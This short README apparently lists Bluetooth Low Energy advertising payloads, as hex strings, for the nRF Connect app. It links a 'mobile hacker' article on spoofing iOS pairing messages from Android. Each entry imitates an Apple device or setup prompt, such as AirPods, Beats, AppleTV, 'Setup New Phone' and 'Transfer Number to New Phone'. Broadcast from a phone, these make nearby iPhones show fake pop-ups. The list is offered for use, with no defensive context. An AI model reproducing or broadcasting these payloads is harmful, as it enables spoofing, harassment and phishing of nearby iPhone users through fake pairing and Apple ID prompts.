# nRF Connect Values

You can use values below to run advertising messages on your android device.

Refer to instructions in [mobile hacker website](https://www.mobile-hacker.com/2023/09/07/spoof-ios-devices-with-bluetooth-pairing-messages-using-android/)

```py
"Airpods": "071907022075aa3001000045121212000000000000000000000000",
"Airpods Pro": "0719070e2075aa3001000045121212000000000000000000000000",
"Airpods Max": "0719070a2075aa3001000045121212000000000000000000000000",
"Airpods Gen 2": "0719070f2075aa3001000045121212000000000000000000000000",
"Airpods Gen 3": "071907132075aa3001000045121212000000000000000000000000",
"Airpods Pro Gen 2": "071907142075aa3001000045121212000000000000000000000000",
"PowerBeats": "071907032075aa3001000045121212000000000000000000000000",
"PowerBeats Pro": "0719070b2075aa3001000045121212000000000000000000000000",
"Beats Solo Pro": "0719070c2075aa3001000045121212000000000000000000000000",
"Beats Studio Buds": "071907112075aa3001000045121212000000000000000000000000",
"Beats Flex": "071907102075aa3001000045121212000000000000000000000000",
"BeatsX": "071907052075aa3001000045121212000000000000000000000000",
"Beats Solo3": "071907062075aa3001000045121212000000000000000000000000",
"Beats Studio3": "071907092075aa3001000045121212000000000000000000000000",
"Beats Studio Pro": "071907172075aa3001000045121212000000000000000000000000",
"Beats Fit Pro": "071907122075aa3001000045121212000000000000000000000000",
"Beats Studio Buds+": "071907162075aa3001000045121212000000000000000000000000",
"AppleTV Setup": "04042a0000000f05c101604c95000010000000",
"AppleTV Pair": "04042a0000000f05c106604c95000010000000",
"AppleTV New User": "04042a0000000f05c120604c95000010000000",
"AppleTV AppleID Setup": "04042a0000000f05c12b604c95000010000000",
"AppleTV Wireless Audio Sync": "04042a0000000f05c1c0604c95000010000000",
"AppleTV Homekit Setup": "04042a0000000f05c10d604c95000010000000",
"AppleTV Keyboard": "04042a0000000f05c113604c95000010000000",
"AppleTV 'Connecting to Network'": "04042a0000000f05c127604c95000010000000",
"Homepod Setup": "04042a0000000f05c10b604c95000010000000",
"Setup New Phone": "04042a0000000f05c109604c95000010000000",
"Transfer Number to New Phone": "04042a0000000f05c102604c95000010000000",
"TV Color Balance": "04042a0000000f05c11e604c95000010000000",
```
